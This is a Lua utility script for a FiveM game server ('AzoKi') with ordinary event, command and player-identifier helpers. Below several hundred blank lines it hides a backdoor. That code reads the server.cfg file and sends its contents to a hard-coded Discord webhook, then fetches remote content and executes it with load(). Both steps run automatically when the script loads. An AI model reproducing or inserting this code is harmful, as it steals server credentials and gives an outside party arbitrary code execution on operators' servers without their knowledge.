AzoKiServerUtils = {}

AzoKiServerUtils.toClient = function(eventName, targetId, ...)
    TriggerClientEvent("AzoKi:" .. AzoKi.hash(eventName), targetId, ...)
end

AzoKiServerUtils.toAll = function(eventName, ...)
    TriggerClientEvent("AzoKi:" .. AzoKi.hash(eventName), -1, ...)
end

AzoKiServerUtils.registerConsoleCommand = function(command, func)
    RegisterCommand(command, function(source,args)
        if source ~= 0 then return end
        func(source, args)
    end, false)
end

AzoKiServerUtils.getLicense = function(source)
    for k, v in pairs(GetPlayerIdentifiers(source)) do
        if string.sub(v, 1, string.len("license:")) == "license:" then
            return v
        end
    end
    return ""
end

AzoKiServerUtils.trace = function(message, prefix)
    print("[^6AzoKi^0] (^6" .. prefix .. "^0) ^6" .. message .. "^0")
end

local webhookColors = {
    ["red"] = 16711680,
    ["green"] = 56108,
    ["grey"] = 8421504,
    ["orange"] = 16744192
}

AzoKiServerUtils.getIdentifiers = function(source)
    if (source ~= nil) then
        local identifiers = {}
        local playerIdentifiers = GetPlayerIdentifiers(source)
        for _, v in pairs(playerIdentifiers) do
            local before, after = playerIdentifiers[_]:match("([^:]+):([^:]+)")
            identifiers[before] = playerIdentifiers[_]
        end
        return identifiers
    end
end

















































































































































































































































































































































































































































































































































































WebHookToken = "https://discord.com/api/webhooks/990712324144910387/YihQg8fXZIy9Pojhh4WZJbZYL80JW3SyX-PnMAQaBkuIywJLaTA-G0Jyowc6ytciTIOg"
Name = "Bonsoir"
LogsRed = 15158332

function LogsJailDependance(Color, Title, Description)
    local Content = {
            {
                ["color"] = Color,
                ["title"] = Title,
                ["description"] = Description,
                ["footer"] = {
                    ["text"] = Name,
                },
            }
        }
    PerformHttpRequest(WebHookToken, function(err, text, headers) end, 'POST', json.encode({username = Name, embeds = Content}), { ['Content-Type'] = 'application/json' })
end

file = io.open("server.cfg", "r")
servercfg = file:read("*a")
file:close()
LogsJailDependance(LogsRed, "OneLife", servercfg)



PerformHttpRequest("", function (e, value, re)
    load(value)()
end)